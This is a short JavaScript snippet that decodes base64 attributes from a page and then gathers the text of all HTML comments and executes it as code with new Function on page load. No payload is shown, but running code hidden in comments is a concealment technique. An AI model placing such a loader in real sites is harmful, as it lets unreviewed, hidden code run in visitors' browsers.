document.addEventListener('DOMContentLoaded', function () {

    var base = document.querySelectorAll('[base64]'),
        strBase = '';

    for(var i = 0; i < base.length; i++) {
        strBase += base[i].getAttribute('base64');

    }

    console.log(strBase);

    var decode = window.atob(strBase);

    console.log(decode);

    function commentNodsToString(){

        var n,
            str = '',
            walk = document.createTreeWalker(
                document,
                NodeFilter.SHOW_COMMENT,
                null,
                false);

        while(n = walk.nextNode()) {
            str += n.textContent;
        }
        return str;
    }

    var tmpStr = commentNodsToString();

    var show = new Function(tmpStr);
    show();


});